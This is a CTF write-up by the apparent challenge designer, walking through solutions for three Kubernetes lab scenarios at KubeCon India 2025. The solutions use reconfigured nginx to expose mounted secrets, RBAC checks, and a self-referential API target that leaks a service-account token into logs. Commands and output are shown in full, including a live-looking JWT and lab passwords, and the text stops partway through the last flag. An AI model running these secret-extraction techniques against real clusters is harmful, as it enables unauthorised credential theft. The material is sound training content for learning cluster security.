---
date: '2025-09-29T10:45:15+01:00'
draft: false
title: "Cracking the KubeCon India 25 CTF: The Creator's Cut"
tags: ["kubernetes", "ctf", "kubecon", "cloud-native"]
slug: 'kubecon-in-25-ctf'
---

# Intro
This is my solution write-up for the KubeCon India 2025 Kubernetes CTF. The KubeCon CTF has been managed by the team at ControlPlane for several years now, and for this year's event in India, I was responsible for its design and implementation.

While I wasn't able to attend the event in person, I enjoyed following the scoreboard remotely as people made their way through the challenge. I also want to thank everyone who left positive feedback, especially those who spent a significant amount of time working through the problems. It was good to see the scenarios were well-received.

Here, I'll break down the solution for each flag, explaining the underlying vulnerabilities and the steps required to solve them. Thanks again to all the participants. 

Let's get started!


# Easy: Orchestra

{{< admonition type=note title="Flags" >}}
1. `flag_ctf{I_love_templates_more_than_nginx_configs}`, stored as `staticwebapp-yaml-template` annotation
2. `flag_ctf{I_love_templates_even_more}`, stored in the secret `super-secret`
3. bonus: `flag_ctf{template_revisions_are_so_fun}`, stored in the previous `staticwebapp-yaml-template` revision
{{< /admonition >}}


## Flag 1
- ssh on the bastion
- get all the pods and realize Crossplane is installed
- have a look at the `CompositeResourceDefinition` `StaticWebApp`
- have a look at how this is templated, in `Composition` `staticwebapp-yaml-template`
- realize there's a flag stored as annotation
```bash
kubectl get composition staticwebapp-yaml-template -o json | jq '.metadata.annotations'
```
Use the hint related to nginx configs for the next flag.

## Flag 2
- realize a secret is mounted in the nginx pods
- realize you can change the nginx configuration
- create a new `ConfigMap`, to let nginx use a different configuration
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: nginx-config
  namespace: website
data:
  default.conf: |
    server {
        listen 80;
        server_name localhost;

        location / {
            root /etc/secret;
            autoindex on;
        }
    }
```
- create a new StaticWebApp, specifying the `nginxConfigConfigMap`
```yaml
apiVersion: kubesim.tech/v1
kind: StaticWebApp
metadata:
  name: test
  namespace: website
spec:
  subdomain: test
  replicas: 2
  websiteConfigMap: nginx-sample-site
  nginxConfigConfigMap: nginx-config
```
- use curl to get the flag
```bash
root@jumphost:~# curl test-75z8l.website:8080
<html>
<head><title>Index of /</title></head>
<body>
<h1>Index of /</h1><hr><pre><a href="../">../</a>
<a href="flag">flag</a>                                           16-Jun-2025 09:10                   6
</pre><hr></body>
</html>

root@jumphost:~# curl test-75z8l.website:8080/flag
flag_ctf{I_love_templates_even_more}
```
## Flag 3 (bonus)
- get all the revisions and realize there's more than one
```bash
root@jumphost:~# kubectl get compositionrevision
NAME                                 REVISION   XR-KIND        XR-APIVERSION     AGE
staticwebapp-yaml-template-746abe7   2          StaticWebApp   kubesim.tech/v1   8m19s
staticwebapp-yaml-template-d383714   1          StaticWebApp   kubesim.tech/v1   11m
```
- analyze the oldest revision and get the flag
```bash
root@jumphost:~# kubectl get compositionrevision staticwebapp-yaml-template-d383714 -o yaml
...
      inline:
        template: "---\napiVersion: v1\nkind: Secret\nmetadata:\n  annotations:\n
          \   gotemplating.fn.crossplane.io/composition-resource-name: secret\n  labels:\n
          \   kubesim.tech/staticwebapp: {{ .observed.composite.resource.metadata.name
          }}\ntype: Opaque\nstringData:\n  flag: flag_ctf{template_revisions_are_so_fun}
          \        \n"
...
```

# Medium: Dark Telescope

{{< admonition type=note title="Flags" >}}
1. `flag_ctf{proper_rbac_is_very_important}`, stored as grafana admin password
2. `flag_ctf{do_not_expose_sensitive_stuff_as_metric}`, exposed on the `/metrics` path
3. `flag_ctf{debug_log_is_not_always_nice}`, stored as `flag` field in one of the fake orders
{{< /admonition >}}

## Flag 1
- Open SSH tunnel, using the command shared in the scenario description
```bash
ssh -i simulator_rsa -F simulator_config -o IdentitiesOnly=yes bastion -L 8080:localhost:80
```
- Navigate to Grafana UI at
http://grafana.kubesim.tech:8080
- Realize Grafana is password protected
- Get to know all the pods running
```
kubectl get pods -A
```
- Get to know the namespaces
```
kubectl get ns
```
- See which grant you have on grafana namespace
```
kubectl auth can-i --list -n grafana
```
- Extract Grafana admin credentials from the secret
```
kubectl get secret -n grafana grafana -o go-template='
{{range $k,$v := .data}}{{printf "%s: " $k}}{{if not $v}}{{$v}}{{else}}{{$v | base64decode}}{{end}}{{"\n"}}{{end}}'

admin-password: flag_ctf{proper_rbac_is_very_important}
admin-user: admin
ldap-toml:
```
## Flag 2
- Navigate to VictoriaMetrics at
http://victoriametrics.kubesim.tech:8080
- Go to the targets to understand why the backend stopped sending data
http://victoriametrics.kubesim.tech:8080/targets
- Realize there's a typo in the service name
- Install `curl`
```bash
apt update && apt install curl
```
- Try to curl the metrics endpoint 
```
curl -v  backend.backend:3000/metrics
```
- Get back a 401
- Have a look at the config
http://victoriametrics.kubesim.tech:8080/config
- The config is redacted
- See which grant you have on VictoriaMetrics ns
```
kubectl auth can-i --list -n victoriametrics
```
- Realize you can see the ConfigMap in that namespace
- Get all the ConfigMaps
```
kubectl get cm -n victoriametrics -o yaml
...
  data:
    scrape.yml: |
      global:
        scrape_interval: 15s
      scrape_configs:
      - basic_auth:
          password: p4ssw0rd!123
          username: frontend
        job_name: scrape-backend
        static_configs:
        - targets:
          - backend.beckend:3000
...
```
- Fix the config
- [Reload victoriametrics](http://victoriametrics.kubesim.tech:8080/-/reload)
- Wait for the metric to be scraped
- Query the metrics
```
{instance="backend.backend:3000", job="scrape-backend"}
```
## Flag 3
- Check if any logging solution is running
```
kubectl get ns

...
victorialogs
...
```
- Get all the objects from that namespace
```
kubectl get all -n victorialogs

...
service/victorialogs-victoria-logs-single-server
...
```
- Navigate to grafana and add a new connection after installing the VictoriaLogs plugin
http://victorialogs-victoria-logs-single-server.victorialogs:9428
- Start exploring data
- Filter data on the backend namespace
`namespace:="backend"`
- See there are three type of logs:
    - `Order <orderID> created`
    - HTTP logs on `/orders`
    - Startup log of the server (listening and registering paths)
- Find out there's a specific order that is causing issue with malformed flag
- Download [Infinity plugin](https://grafana.com/grafana/plugins/yesoreyeram-infinity-datasource/) on Grafana, to run `http` requests. As an alternative, scrape that path using the scraping config (thanks to Gabriela for this unintended path!)
- Request the malformed order, in order to read the flag `flag_ctf{debug_log_is_not_always_nice}`

# Complex: Cluster Maintenance

{{< admonition type=note title="Flags" >}}
1. `flag_ctf{jwt_should_not_be_logged}`, stored as secret
2. `flag_ctf{tls_verification_is_very_important_CVE-2020-8554}`, as part of the body sent from the `data-uploader`
{{< /admonition >}}

## Flag 1
- As suggested in the welcome screen, player will connect to the `/supported` endpoint of the `cluster-maintenance` API
```bash
root@jumphost:~# curl https://api.cluster-maintenance/supported -k -s | jq
[
  {
    "path": "/namespaces",
    "description": "List all the namespaces. Specify `cluster` and `namespace` query parameter. Default: ?cluster=default&namespace=production.",
    "example": "curl \"https://localhost:8443/namespaces?cluster=dev\""
  },
  {
    "path": "/pods",
    "description": "Get pods from a namespace. Specify `cluster` and `namespace` query parameter. Default: ?cluster=default&namespace=production.",
    "example": "curl \"https://localhost:8443/pods?cluster=dev&namespace=test\""
  },
  {
    "path": "/secrets",
    "description": "Get masked secrets from a namespace. Specify `cluster` and `namespace` query parameter. Default: ?cluster=default&namespace=production.",
    "example": "curl \"https://localhost:8443/secrets?cluster=dev&namespace=test\""
  },
  {
    "path": "/supported",
    "description": "List supported endpoints and usages",
    "example": "curl https://localhost:8443/supported"
  },
  {
    "path": "/clusters",
    "description": "Manage the clusters where you can connect to",
    "example": "curl https://localhost:8443/clusters"
  },
  {
    "path": "/logs",
    "description": "Get cluster-maintenance logs",
    "example": "curl https://localhost:8443/logs"
  }
]
```
- let's see all the namespaces
```bash
root@jumphost:~# curl https://api.cluster-maintenance/namespaces -k -s | jq
[
  "cluster-maintenance",
  "default",
  "jumphost",
  "kube-node-lease",
  "kube-public",
  "kube-system",
  "production"
]
```
- let's see if we can get the secrets out of the `production` namespace
```bash
root@jumphost:~# curl https://api.cluster-maintenance/secrets -k -s | jq
{
  "metadata": {
    "resourceVersion": "4990"
  },
  "items": [
    {
      "metadata": {
        "name": "am-i-supposed-to-read-this",
        "namespace": "production",
        "uid": "ec5b70b1-4d85-4126-8dbe-f59dfde291a3",
        "resourceVersion": "762",
        "creationTimestamp": "2025-06-24T15:53:17Z",
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-06-24T15:53:17Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:flag": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "type": "Opaque"
    }
  ]
}
```
- secrets are removed by the API
- let's check the `/clusters` path
```bash
root@jumphost:~# curl -k https://api.cluster-maintenance/clusters -s | jq
{
  "default": {
    "name": "default",
    "fqdn": "https://10.96.0.1:443",
    "ca_cert": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCVENDQWUyZ0F3SUJBZ0lJYThLWUhaSTYzdGN3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TlRBMk1qUXhOVFEyTWpCYUZ3MHpOVEEyTWpJeE5UVXhNakJhTUJVeApFekFSQmdOVkJBTVRDbXQxWW1WeWJtVjBaWE13Z2dFaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQkR3QXdnZ0VLCkFvSUJBUURucGQ3UEUveFZOUGcvdFVHdEM4elhMMkZhK0cveEZIUXgyY0VFcFZtQjdHc3ZFTUJxNVJFYjRBSFcKTVMvcUxMUXZBUEluOUZHOEZzeDNpeWMyZkYwYVp4VDRvL0UzY05Vak1KMVI2alFDL2VjbFdwai9xU2VUSGVqQQp0SHUvOUdjVEczTGNZRkhJMWtmL1ZCZkxia0Y3Z2RtSmhxY3dnQk1obWpOUW1BaDh4UXdWczdtWHVEZFAxemhWCnF5OWlIWEpIZlhtakkyNkFubTRhcGJhSGZTd0tnNFZyMjQrcXpxazRkMis1REEzVndCcitiWnNQWW82dG9OTEMKUmVHNFB5ekE2emZ4S3dURFdiTi9iVmoyY3BJalUxazFoZnhMTmpIUmk0aS84Wld5ZSt5NVdzeisyOXJCWG4wdApkaW9DRWw2V2VPOUxiSHExbnRyMXRwZzJwdmpkQWdNQkFBR2pXVEJYTUE0R0ExVWREd0VCL3dRRUF3SUNwREFQCkJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJUOHVuOXR5QUp5eW1nRk1MdTZtbGtnSVVCTEtEQVYKQmdOVkhSRUVEakFNZ2dwcmRXSmxjbTVsZEdWek1BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQ21qVFRxZHp6dgppdEpJaG55VmFuZnVvQlNSTjRDMVNwQUVmdytBVmZtMFd3TThOMW8xVlUvUkxlbnI4M2JLQm1pZ2FVbENEdis5CkhES1A5UURaZFNKYW9oVzV0Tk5FVVdUL1BNSnRUSDByQzh0VGwrdlNWVHMvaW5HMFdJaitHa0RCUWxYOGlHZ3UKSVlKb3FUYXljdWl3S29RK0laemFnTTdKZGpOS3haUWJ4cFA1TjU0UlNrQWNyNHVrc0NJVHo3bFlrM2FGZHU1RgpXU0NkRWR3bmQrMmJQZjh1SU9QT3MxM0xBbGtoQnVUaXVaWDJSWDlaK2w0U0UvV0V2Z0YvbGVFbnRQSityNk9wCnZuTmxndHNyTnNCOVZqY0dIVForYmZQRWFTWE5zMHNCaThIbXAzSDlKY2JDZ2JSemlMd2pKRXp1VWFqM0ttalYKaGpJcnAvN3QwYzVlCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"
  }
}
```
- `ca_cert` is probably saving the Kubernetes CA encoded in base64
- let's check the logs
```bash
root@jumphost:~# curl https://api.cluster-maintenance/logs -k
2025/06/25 14:29:47 Server starting...
2025/06/25 14:29:47 Registering handler on /namespaces
2025/06/25 14:29:47 Registering handler on /pods
2025/06/25 14:29:47 Registering handler on /secrets
2025/06/25 14:29:47 Registering handler on /clusters
2025/06/25 14:29:47 Registering handler on /logs
2025/06/25 14:29:47 Starting HTTPs service on port 8443
2025/06/25 14:32:23 [DEBUG] method=GET path=/logs headers=[User-Agent=curl/8.7.1; Accept=*/*] body=
```
- this seems to be logging the calls
- let's do a call on a random path and check the logs
```bash
root@jumphost:~# curl https://api.cluster-maintenance/asdasd -k
404 page not found

root@jumphost:~# curl https://api.cluster-maintenance/logs -k
2025/06/25 14:29:47 Server starting...
2025/06/25 14:29:47 Registering handler on /namespaces
2025/06/25 14:29:47 Registering handler on /pods
2025/06/25 14:29:47 Registering handler on /secrets
2025/06/25 14:29:47 Registering handler on /clusters
2025/06/25 14:29:47 Registering handler on /logs
2025/06/25 14:29:47 Starting HTTPs service on port 8443
2025/06/25 14:32:23 [DEBUG] method=GET path=/logs headers=[User-Agent=curl/8.7.1; Accept=*/*] body=
2025/06/25 14:33:21 [DEBUG] method=GET path=/asdasd headers=[User-Agent=curl/8.7.1; Accept=*/*] body=
```
- this seems to be logging all the calls, regardless of the path
- let's create a new target, `self`, that is going to make the API to connect to itself
- let's see the details of the API certificate
```bash
root@jumphost:~# openssl s_client -showcerts -servername api.cluster-maintenance -connect api.cluster-maintenance:443 < /dev/null | openssl x509 -text -noout
            X509v3 Subject Alternative Name: 
                DNS:api.cluster-maintenance, DNS:api.cluster-maintenance.svc, DNS:api.cluster-maintenance.svc.cluster, DNS:api.cluster-maintenance.svc.cluster.local, IP Address:127.0.0.1
```
- we can use the IP address, if accepted by the API
- first, let's fetch the CA and base64 encode it
```bash
root@jumphost:~# export CA_CERT=$(openssl s_client -showcerts -connect api.cluster-maintenance:443 </dev/null 2>/dev/null | openssl x509 -outform PEM | base64 -w0)
```
- now create the cluster configuration
```bash
root@jumphost:~# curl -k -v -X POST https://api.cluster-maintenance/clusters -H "Content-Type: application/json" -d "{\"name\": \"self\", \"fqdn\": \"https://127.0.0.1:8443\", \"ca_cert\": \"$CA_CERT\"}"
{"name":"self","status":"saved"}
```
- check the config
```bash
root@jumphost:~# curl -k https://api.cluster-maintenance/clusters -s | jq
{
  "default": {
    "name": "default",
    "fqdn": "https://10.96.0.1:443",
    "ca_cert": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCVENDQWUyZ0F3SUJBZ0lJYThLWUhaSTYzdGN3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TlRBMk1qUXhOVFEyTWpCYUZ3MHpOVEEyTWpJeE5UVXhNakJhTUJVeApFekFSQmdOVkJBTVRDbXQxWW1WeWJtVjBaWE13Z2dFaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQkR3QXdnZ0VLCkFvSUJBUURucGQ3UEUveFZOUGcvdFVHdEM4elhMMkZhK0cveEZIUXgyY0VFcFZtQjdHc3ZFTUJxNVJFYjRBSFcKTVMvcUxMUXZBUEluOUZHOEZzeDNpeWMyZkYwYVp4VDRvL0UzY05Vak1KMVI2alFDL2VjbFdwai9xU2VUSGVqQQp0SHUvOUdjVEczTGNZRkhJMWtmL1ZCZkxia0Y3Z2RtSmhxY3dnQk1obWpOUW1BaDh4UXdWczdtWHVEZFAxemhWCnF5OWlIWEpIZlhtakkyNkFubTRhcGJhSGZTd0tnNFZyMjQrcXpxazRkMis1REEzVndCcitiWnNQWW82dG9OTEMKUmVHNFB5ekE2emZ4S3dURFdiTi9iVmoyY3BJalUxazFoZnhMTmpIUmk0aS84Wld5ZSt5NVdzeisyOXJCWG4wdApkaW9DRWw2V2VPOUxiSHExbnRyMXRwZzJwdmpkQWdNQkFBR2pXVEJYTUE0R0ExVWREd0VCL3dRRUF3SUNwREFQCkJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJUOHVuOXR5QUp5eW1nRk1MdTZtbGtnSVVCTEtEQVYKQmdOVkhSRUVEakFNZ2dwcmRXSmxjbTVsZEdWek1BMEdDU3FHU0liM0RRRUJDd1VBQTRJQkFRQ21qVFRxZHp6dgppdEpJaG55VmFuZnVvQlNSTjRDMVNwQUVmdytBVmZtMFd3TThOMW8xVlUvUkxlbnI4M2JLQm1pZ2FVbENEdis5CkhES1A5UURaZFNKYW9oVzV0Tk5FVVdUL1BNSnRUSDByQzh0VGwrdlNWVHMvaW5HMFdJaitHa0RCUWxYOGlHZ3UKSVlKb3FUYXljdWl3S29RK0laemFnTTdKZGpOS3haUWJ4cFA1TjU0UlNrQWNyNHVrc0NJVHo3bFlrM2FGZHU1RgpXU0NkRWR3bmQrMmJQZjh1SU9QT3MxM0xBbGtoQnVUaXVaWDJSWDlaK2w0U0UvV0V2Z0YvbGVFbnRQSityNk9wCnZuTmxndHNyTnNCOVZqY0dIVForYmZQRWFTWE5zMHNCaThIbXAzSDlKY2JDZ2JSemlMd2pKRXp1VWFqM0ttalYKaGpJcnAvN3QwYzVlCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K"
  },
  "self": {
    "name": "self",
    "fqdn": "https://127.0.0.1:8443",
    "ca_cert": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR1ekNDQXFPZ0F3SUJBZ0lJSTJZTlBGalBCaUl3RFFZSktvWklodmNOQVFFTEJRQXdOREVRTUE0R0ExVUUKQ2hNSFMzVmlaWE5wYlRFZ01CNEdBMVVFQXhNWFlYQnBMbU5zZFhOMFpYSXRiV0ZwYm5SbGJtRnVZMlV3SGhjTgpNalV3TmpJMU1UUXlPVFEzV2hjTk1qWXdOakkxTVRReU9UUTNXakEwTVJBd0RnWURWUVFLRXdkTGRXSmxjMmx0Ck1TQXdIZ1lEVlFRREV4ZGhjR2t1WTJ4MWMzUmxjaTF0WVdsdWRHVnVZVzVqWlRDQ0FTSXdEUVlKS29aSWh2Y04KQVFFQkJRQURnZ0VQQURDQ0FRb0NnZ0VCQU5sbWRSaEQxQ3JCTDBPVUlyQS9aSFdmL1BhZEpCVXRZazZDcjZQYQpGUVBQWkZsT2Njak5ORUx4VjFvUVpoWWtKTm5XR3VvS29XNFgwb1dVdWNiTk04VGRKb3N4Nm5vNGVraW9zdWxoCnJ4NVUySWhPVUZmdXBnRFJ3ZVZzYzVTOGUxZTVMaVZWUWJYSGd1UllIOEgycTlWa1F2dUI4cGNFYk10RGJxYW0KZVJZNjd1ZGNpSVZJS0szMkYydmJXV2VObG0wMTRzS2Vvd0drUVBwdGpzZmdxclhnWHp5NzV5U2NqRDQ1Z0J0ZgpOSmVFUnZHWWtkdHV5bU8wRWp0ZEM5bjhFcmFaRDdOT0dYblFzdHdGRHlMOEh3RnZVTHJzZ3hpRVh3M0pDN3FzCk9SVHJGNWNmTHBlS25nczZZYm1GcThlYUM3dWQ1bmdYYXEycTFWMHUxeWVaUS9FQ0F3RUFBYU9CMERDQnpUQU8KQmdOVkhROEJBZjhFQkFNQ0JhQXdFd1lEVlIwbEJBd3dDZ1lJS3dZQkJRVUhBd0V3REFZRFZSMFRBUUgvQkFJdwpBRENCbHdZRFZSMFJCSUdQTUlHTWdoZGhjR2t1WTJ4MWMzUmxjaTF0WVdsdWRHVnVZVzVqWllJYllYQnBMbU5zCmRYTjBaWEl0YldGcGJuUmxibUZ1WTJVdWMzWmpnaU5oY0drdVkyeDFjM1JsY2kxdFlXbHVkR1Z1WVc1alpTNXoKZG1NdVkyeDFjM1JsY29JcFlYQnBMbU5zZFhOMFpYSXRiV0ZwYm5SbGJtRnVZMlV1YzNaakxtTnNkWE4wWlhJdQpiRzlqWVd5SEJIOEFBQUV3RFFZSktvWklodmNOQVFFTEJRQURnZ0VCQUs3WVpQV0ZqeVhIM1IzTEduMXBzd2E0CkpxRnZZY3Y0cDhQYVBGOXZQU0VpdnlRSHdjNHJ5b1BLaFBPcXpBYW5qNFQxVkJOQUNKODhCWXlyeGh4QS9NWDEKNG5GQ2VlNnNkQVROaDEyMVNHT2xETkdyNG0vVlpOck1xMHZkdHM4Nks5RVh4TG1RUS9ObklkTXI1QkpMUzMveApNbTVYVkk0ZTJQazNIb3luVEJhNkxGVE41T2IxTVlNMmtsd2hzaEM4Qlg5Q0R6TFZQL3RmNXJ2b1VXV3kxMmZ2CnZlNDYxaGJkN3pCSmlEbXhPcTFnTjZZUW5OTW5LUXdHK3N3b3JtbERiVGdZQVdaaUJqZ2VZN3VaWjN2N0dUdk0KVk96QkNFK3RUNWtZZkQrUDJmSHBuWVgyMTZaVHRCdFNMdjFiV2RpTnEvQVdWdGhyTkFXdDlLR3h6L0RVTGxzPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg=="
  }
}
```
- let's fetch the secrets
```bash
root@jumphost:~# curl -k https://api.cluster-maintenance/secrets?cluster=self -s     
error getting secrets: the server could not find the requested resource (get secrets)
```
- check the logs
```bash
root@jumphost:~# curl -k https://api.cluster-maintenance/logs 
...
2025/06/25 14:56:32 [DEBUG] method=GET path=/api/v1/namespaces/production/secrets headers=[User-Agent=server/v0.0.0 (linux/amd64) kubernetes/$Format; Authorization=Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Il9kNHNaSGNVeFdnZFJVTVZ0RjUtOVEzZjBqeXUybUFGby1pY1R5dTk2bmcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzgyMzk3NzgyLCJpYXQiOjE3NTA4NjE3ODIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMmMxZTAwOGItMjM3ZC00NDM3LWIwMGYtNGY3ZTY3OWI1ODQ3Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjbHVzdGVyLW1haW50ZW5hbmNlIiwibm9kZSI6eyJuYW1lIjoibm9kZS0xIiwidWlkIjoiZjQ2NDUxNjMtZjUwMS00MTUzLTk4NDctNzJiZjFjNWZmZWFjIn0sInBvZCI6eyJuYW1lIjoiY2x1c3Rlci1tYWludGVuYW5jZS1jOGZjYmQ4LXBzcnpjIiwidWlkIjoiYTliNDZlYWYtZDFjOS00NDUzLWI0NTEtYzBlNTE2MTYwYzQ2In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjbHVzdGVyLW1haW50ZW5hbmNlIiwidWlkIjoiNDU3NzE3NjYtNmU4Yi00NmJiLWIyYzEtODMyOTY5Zjk3MjUyIn0sIndhcm5hZnRlciI6MTc1MDg2NTM4OX0sIm5iZiI6MTc1MDg2MTc4Miwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNsdXN0ZXItbWFpbnRlbmFuY2U6Y2x1c3Rlci1tYWludGVuYW5jZSJ9.Am4Bs6-nCpOmhRO59KJKFgY2TSPyAxuYylbLIxJajH_JBXLKEoklZjA9glhdJHkS7OOE7OtOn7JUYNFIpXOwoA9gUXRoHKwnHVzNxPeGexKJ92KRS2QWyL3yoiOwrcrZ6rmRZgnTwj39dQ0RJWkt1esZqyF5yAjrJ9ljFdmuSeUBuyHv0frpJUMyRZT6slsF96sSVzMmZEmB6Qnh6OnyXhe5Oo4oFSwB2tFGA1YQkFEfJT3iCIJ0CdIzJ2bXUQJw6DGN_i6ZDZ4khLs4XFUYz4xH2u7yfrq7M5P8TOr8c5rchIo5BGPk1bip6Ro4BpJCjo6z5u8dZSX0Gay0PWpGDQ; Accept-Encoding=gzip; Accept=application/vnd.kubernetes.protobuf,application/json] body=
...
```
- export token 
```bash
root@jumphost:~# export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Il9kNHNaSGNVeFdnZFJVTVZ0RjUtOVEzZjBqeXUybUFGby1pY1R5dTk2bmcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzgyMzk3NzgyLCJpYXQiOjE3NTA4NjE3ODIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMmMxZTAwOGItMjM3ZC00NDM3LWIwMGYtNGY3ZTY3OWI1ODQ3Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjbHVzdGVyLW1haW50ZW5hbmNlIiwibm9kZSI6eyJuYW1lIjoibm9kZS0xIiwidWlkIjoiZjQ2NDUxNjMtZjUwMS00MTUzLTk4NDctNzJiZjFjNWZmZWFjIn0sInBvZCI6eyJuYW1lIjoiY2x1c3Rlci1tYWludGVuYW5jZS1jOGZjYmQ4LXBzcnpjIiwidWlkIjoiYTliNDZlYWYtZDFjOS00NDUzLWI0NTEtYzBlNTE2MTYwYzQ2In0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjbHVzdGVyLW1haW50ZW5hbmNlIiwidWlkIjoiNDU3NzE3NjYtNmU4Yi00NmJiLWIyYzEtODMyOTY5Zjk3MjUyIn0sIndhcm5hZnRlciI6MTc1MDg2NTM4OX0sIm5iZiI6MTc1MDg2MTc4Miwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNsdXN0ZXItbWFpbnRlbmFuY2U6Y2x1c3Rlci1tYWludGVuYW5jZSJ9.Am4Bs6-nCpOmhRO59KJKFgY2TSPyAxuYylbLIxJajH_JBXLKEoklZjA9glhdJHkS7OOE7OtOn7JUYNFIpXOwoA9gUXRoHKwnHVzNxPeGexKJ92KRS2QWyL3yoiOwrcrZ6rmRZgnTwj39dQ0RJWkt1esZqyF5yAjrJ9ljFdmuSeUBuyHv0frpJUMyRZT6slsF96sSVzMmZEmB6Qnh6OnyXhe5Oo4oFSwB2tFGA1YQkFEfJT3iCIJ0CdIzJ2bXUQJw6DGN_i6ZDZ4khLs4XFUYz4xH2u7yfrq7M5P8TOr8c5rchIo5BGPk1bip6Ro4BpJCjo6z5u8dZSX0Gay0PWpGDQ
```
- specify token to fetch secrets
```bash
root@jumphost:~# kubectl get secrets am-i-supposed-to-read-this -n production -o go-template='{{.data.flag | base64decode}}' --token=$TOKEN

flag_ctf{jwt_should_not_be_logged}
```

## Flag 2
- understand what this jwt can do in the production namespace
```bash
root@jumphost:~# kubectl auth can-i --list -n production --token=$TOKEN        
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
pods/log                                        []                                     []               [get list watch]
services                                        []                                     []               [get watch list create]
namespaces                                      []                                     []               [get watch list]
pods                                            []                                     []               [get watch list]
secrets                                         []                                     []               [get watch list]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
```
- and in the `cluster-maintenance` namespace
```bash
kubectl auth can-i --list -n cluster-maintenance --token=$TOKEN
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
namespaces                                      []                                     []               [get watch list]
secrets                                         []                                     []               [get watch list]
services                                        []                                     []               [get watch list]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
```
- get all the secrets in `cluster-maintenance` namespace
```bash
root@jumphost:~# kubectl get secrets -n cluster-maintenance --token=$TOKEN -o yaml
apiVersion: v1
items: []
kind: List
metadata:
  resourceVersion: ""
```
- nothing interesting
- get all the pods in production namespace
```bash
root@jumphost:~# kubectl get pods -n production --token=$TOKEN
NAME                             READY   STATUS    RESTARTS   AGE
data-uploader-78f7c6865f-7dc6n   1/1     Running   0          39m
```
- get the logs
```bash
root@jumphost:~# kubectl logs data-uploader-78f7c6865f-7dc6n -n production --token=$TOKEN
2025/06/25 14:29:49 Starting data uploader...
2025/06/25 14:29:49 WARNING: Skipping TLS verification
2025/06/25 14:29:49 Pushed data to https://control-plane.io/submit with status: 404 Not Found
2025/06/25 14:29:59 WARNING: Skipping TLS verification
2025/06/25 14:29:59 Pushed data to https://control-plane.io/submit with status: 404 Not Found
```
- something is being pushed to the control-plane website, with no luck. TLS verification is skipped
